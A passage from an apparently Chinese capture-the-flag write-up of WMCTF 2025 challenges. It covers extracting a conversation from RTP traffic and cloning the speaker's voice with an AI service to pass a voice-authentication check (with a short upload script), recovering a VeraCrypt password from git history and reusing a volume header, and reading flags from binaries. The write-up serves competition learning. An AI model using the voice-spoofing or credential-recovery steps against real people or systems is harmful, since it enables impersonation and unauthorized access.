</span></span></span></code></pre></div><p>删掉一些无意义的额外字符就能得到flag：wmctf{SVG_Phishing_Attack_Detection_Evasion}</p><p>参考资料：</p><p><a href=https://xz.aliyun.com/news/17777>https://xz.aliyun.com/news/17777</a></p><hr><h2 id=voice_hacker>Voice_hacker<a hidden class=anchor aria-hidden=true href=#voice_hacker>#</a></h2><p>一段UDP流量，猜测传输了一段音频，解码为RTP，再进行RTP流的分析与保存得到一段wav，里面是一段日常的对话</p><p>web服务要求录入一段指定内容的音频<code>CTF，启动！</code>来进行认证：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>isRecording</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>mediaRecorder</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>audioChunks</span> <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>showStatus</span>(<span style=color:#a6e22e>message</span>, <span style=color:#a6e22e>type</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;info&#39;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>statusDiv</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;status&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>statusDiv</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>message</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>statusDiv</span>.<span style=color:#a6e22e>className</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`status </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>type</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>statusDiv</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>display</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;block&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>showResult</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 隐藏状态条，只展示结果框，避免同时出现两条信息
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>statusDiv</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;status&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>statusDiv</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>display</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;none&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>resultDiv</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;result&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>resultDiv</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>display</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;block&#39;</span>;
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>success</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>resultDiv</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;h3&gt;✅ 认证成功！&lt;/h3&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                `</span>;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>resultDiv</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;h3&gt;❌ 认证失败&lt;/h3&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                `</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>startRecording</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isRecording</span>) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>recordButton</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;recordButton&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>disabled</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;录音中...&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>classList</span>.<span style=color:#a6e22e>add</span>(<span style=color:#e6db74>&#39;recording&#39;</span>);
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;正在录音...&#39;</span>, <span style=color:#e6db74>&#39;info&#39;</span>);
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 模拟录音过程
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>simulateRecording</span>();
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 模拟录音完成后自动发送
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>submitFakeAudio</span>();
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#39;录音错误:&#39;</span>, <span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;录音失败，请重试&#39;</span>, <span style=color:#e6db74>&#39;error&#39;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>resetButton</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>simulateRecording</span>() {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 模拟录音过程，显示倒计时
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> Promise((<span style=color:#a6e22e>resolve</span>) =&gt; {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>countdown</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>interval</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>setInterval</span>(() =&gt; {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>countdown</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>`录音中... </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>countdown</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>, <span style=color:#e6db74>&#39;info&#39;</span>);
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>countdown</span><span style=color:#f92672>--</span>;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>clearInterval</span>(<span style=color:#a6e22e>interval</span>);
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;录音完成，正在处理...&#39;</span>, <span style=color:#e6db74>&#39;info&#39;</span>);
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>resolve</span>();
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }, <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>            });
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>submitFakeAudio</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;正在认证...&#39;</span>, <span style=color:#e6db74>&#39;info&#39;</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 先获取随机生成的音频文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;获取随机音频文件...&#39;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>audioResponse</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/api/fake_audio&#39;</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>audioResponse</span>.<span style=color:#a6e22e>ok</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#39;获取音频文件失败&#39;</span>);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>audioBlob</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>audioResponse</span>.<span style=color:#a6e22e>blob</span>();
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;获取到音频文件，大小:&#39;</span>, <span style=color:#a6e22e>audioBlob</span>.<span style=color:#a6e22e>size</span>, <span style=color:#e6db74>&#39;bytes&#39;</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 确保blob有正确的MIME类型
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>audioFile</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>File</span>([<span style=color:#a6e22e>audioBlob</span>], <span style=color:#e6db74>&#39;recording.wav&#39;</span>, { 
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;audio/wav&#39;</span> 
</span></span><span style=display:flex><span>                });
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 使用获取到的音频文件进行认证
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>formData</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FormData</span>();
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>formData</span>.<span style=color:#a6e22e>append</span>(<span style=color:#e6db74>&#39;audio&#39;</span>, <span style=color:#a6e22e>audioFile</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;发送认证请求...&#39;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;音频文件类型:&#39;</span>, <span style=color:#a6e22e>audioFile</span>.<span style=color:#a6e22e>type</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;音频文件大小:&#39;</span>, <span style=color:#a6e22e>audioFile</span>.<span style=color:#a6e22e>size</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#39;/api/authenticate&#39;</span>, {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>formData</span>
</span></span><span style=display:flex><span>                });
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>ok</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>`HTTP </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>status</span><span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>statusText</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>json</span>();
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;认证结果:&#39;</span>, <span style=color:#a6e22e>data</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>data</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>success</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;认证成功&#39;</span>, <span style=color:#e6db74>&#39;success&#39;</span>);
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>&#39;认证失败&#39;</span>, <span style=color:#e6db74>&#39;error&#39;</span>);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>showResult</span>(<span style=color:#a6e22e>data</span>);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#39;认证错误:&#39;</span>, <span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>showStatus</span>(<span style=color:#e6db74>`认证失败: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>error</span>.<span style=color:#a6e22e>message</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>, <span style=color:#e6db74>&#39;error&#39;</span>);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>finally</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>resetButton</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>resetButton</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>recordButton</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;recordButton&#39;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>disabled</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;开始录音&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>recordButton</span>.<span style=color:#a6e22e>classList</span>.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#39;recording&#39;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span></code></pre></div><p>尝试根据已有录音AI生成一段指定内容的音频，使用在线网站：https://www.minimax.io/audio</p><p>第一次直接生成认证失败了，第二次往里面添加了几秒的原音频片段用于模仿口音，就能生成通过认证的音频，下载下来是个mp3转一下wav再上传就行：</p><p><img alt=alt loading=lazy src=/images/WMCTF2025/2.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://49.232.42.74:31999/api/authenticate&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>audio <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;clone2.wav&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(audio, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    files <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;audio&#39;</span>: (<span style=color:#e6db74>&#39;recording.wav&#39;</span>, f, <span style=color:#e6db74>&#39;audio/wav&#39;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, files<span style=color:#f92672>=</span>files)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(resp<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><p>response：</p><pre tabindex=0><code>{
  &#34;flag&#34;: &#34;WMCTF{01a9a4f1-e748-43fa-8d6d-bba372016adc}&#34;,
  &#34;message&#34;: &#34;\u8ba4\u8bc1\u6210\u529f&#34;,
  &#34;success&#34;: true
}
</code></pre><p>参考资料：</p><p><a href=https://www.cnblogs.com/dier-gaohe/p/17716972.html>https://www.cnblogs.com/dier-gaohe/p/17716972.html</a></p><hr><h2 id=githacker>githacker<a hidden class=anchor aria-hidden=true href=#githacker>#</a></h2><p>查看操作日志：</p><pre tabindex=0><code>git reflog
484c0d3 (HEAD -&gt; master) HEAD@{0}: commit: have a good time!
93ab7b9 HEAD@{1}: reset: moving to HEAD~1
d504bbf HEAD@{2}: commit: encryptedFile
93ab7b9 HEAD@{3}: commit: change password
6ec92bc HEAD@{4}: reset: moving to HEAD~1
a026274 HEAD@{5}: commit: password
6ec92bc HEAD@{6}: commit: encryptedFile
6b6285c HEAD@{7}: commit (initial): Init
</code></pre><p>一条一条查详细信息：</p><pre tabindex=0><code>git show 6b6285c
commit 6b6285cc1283144db890f1b27cc8c7b6ccd4b643
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:13:39 2025 +0800

    Init

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..43122ff
--- /dev/null
+++ b/README.md
@@ -0,0 +1 @@
+&#34;# Welcome to WMCTF 2025&#34;


git show 6ec92bc
commit 6ec92bcfdf3044bf21dcfa74500cbb929c0f0037
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:14:06 2025 +0800

    encryptedFile

diff --git a/image.png b/image.png
new file mode 100644
index 0000000..27e6acd
Binary files /dev/null and b/image.png differ


git show a026274
commit a026274fb418ec88af16444644fccab9b8a7e8dd
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:14:40 2025 +0800

    password

diff --git a/password.md b/password.md
new file mode 100644
index 0000000..1ab140f
--- /dev/null
+++ b/password.md
@@ -0,0 +1 @@
+&#34;EasyP@ssw0rd_from_Git_History&#34;


git show 93ab7b9
commit 93ab7b9e28a4d442ec77a3fb37d64912bbddfdad
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:19:32 2025 +0800

    change password


git show d504bbf
commit d504bbf75693fc83f6cf5c873306b7fc67edd804
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:23:51 2025 +0800

    encryptedFile

diff --git a/image.jpg b/image.jpg
new file mode 100644
index 0000000..a3a40e3
Binary files /dev/null and b/image.jpg differ


git show 484c0d3
commit 484c0d313c560eb48986ef96690ef2f034addc90 (HEAD -&gt; master)
Author: toto &lt;toto@WMCTF2025.com&gt;
Date:   Sat Aug 9 17:25:29 2025 +0800

    have a good time!
</code></pre><p>恢复文件：</p><pre tabindex=0><code>git checkout 6ec92bc -- image.png
git checkout a026274 -- password.md
git checkout d504bbf -- image.jpg
</code></pre><p><code>image.png</code> 和 <code>image.jpg</code> 都是VeraCrypt的加密容器，其中<code>image.png</code>能够直接用密码<code>EasyP@ssw0rd_from_Git_History</code>挂载，flag.txt：</p><pre tabindex=0><code>Congratulations! This is half of the gift I gave you:
WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_
Don&#39;t forget the way you came!Please keep trying to find the remaining gifts!
</code></pre><p>后半段flag肯定在<code>image.jpg</code>中了，但是根据历史记录来看是修改过密码的，无法直接用<code>image.png</code>的密码解密</p><p>VeraCrypt是通过主密钥来加解密文件的，而主密钥存在于加密卷头中，加密卷头又由密码进行加解密，因此如果<code>image.jpg</code>主密钥没变只是修改了密码，那么只需要从<code>image.png</code>中备份加密卷头，再用该加密卷头来恢复<code>image.jpg</code>的密码，这样就可以绕过密码未知的问题：</p><pre tabindex=0><code>1.使用image.png备份加密卷头信息，输入image.png容器密码进行验证
2.使用备份的加密卷头来恢复image.jpg的加密卷头信息
3.结束后会提示旧密码已恢复，此时已经可以用EasyP@ssw0rd_from_Git_History来挂载image.jpg容器
</code></pre><p>flag.txt：</p><pre tabindex=0><code>Congratulations! You&#39;ve solved it!
Figuring out the volume header manipulation trick is a sign of a true expert.
You&#39;ve earned this. Well played!

And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}
</code></pre><p>完整flag：WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}</p><p>参考资料：</p><p><a href="https://www.reddit.com/r/VeraCrypt/comments/j1gnfx/difference_between_rescue_disk_and_volume_header/?tl=zh-hans">https://www.reddit.com/r/VeraCrypt/comments/j1gnfx/difference_between_rescue_disk_and_volume_header/?tl=zh-hans</a></p><hr><h2 id=catfriend>catfriend<a hidden class=anchor aria-hidden=true href=#catfriend>#</a></h2><p>flag硬编码在程序里了，IDA打开搜索字符串就能找到：WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p><hr><h2 id=appfriend>appfriend<a hidden class=anchor aria-hidden=true href=#appfriend>#</a></h2><p>jadx找到MainActivity：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> <span style=color:#66d9ef>extends</span> AbstractActivityC0115h {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* renamed from: x, reason: collision with root package name */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> EditText f1494x;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>loadLibrary</span>(<span style=color:#e6db74>&#34;yellow&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>MainActivity</span>() {
</span></span><span style=display:flex><span>        ((e) <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>f818e</span>.<span style=color:#a6e22e>f832c</span>).<span style=color:#a6e22e>e</span>(<span style=color:#e6db74>&#34;androidx:appcompat&#34;</span>, <span style=color:#66d9ef>new</span> C0098a(<span style=color:#66d9ef>this</span>));
</span></span><span style=display:flex><span>        h(<span style=color:#66d9ef>new</span> C0114g(<span style=color:#66d9ef>this</span>));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>native</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>checkflag</span>(String str);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// e.AbstractActivityC0115h, androidx.activity.k, x.f, android.app.Activity</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onCreate</span>(Bundle bundle) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>onCreate</span>(bundle);
</span></span><span style=display:flex><span>        View inflate <span style=color:#f92672>=</span> getLayoutInflater().<span style=color:#a6e22e>inflate</span>(R.<span style=color:#a6e22e>layout</span>.<span style=color:#a6e22e>activity_main</span>, (ViewGroup) <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> i2 <span style=color:#f92672>=</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>button</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (((Button) d.<span style=color:#a6e22e>j</span>(inflate, R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>button</span>)) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (((EditText) d.<span style=color:#a6e22e>j</span>(inflate, R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>editText</span>)) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (((TextView) d.<span style=color:#a6e22e>j</span>(inflate, R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>sample_text</span>)) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                    setContentView((ConstraintLayout) inflate);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>f1494x</span> <span style=color:#f92672>=</span> (EditText) findViewById(R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>editText</span>);
</span></span><span style=display:flex><span>                    ((Button) findViewById(R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>button</span>)).<span style=color:#a6e22e>setOnClickListener</span>(<span style=color:#66d9ef>new</span> k(2, <span style=color:#66d9ef>this</span>));
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                i2 <span style=color:#f92672>=</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>sample_text</span>;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                i2 <span style=color:#f92672>=</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>editText</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
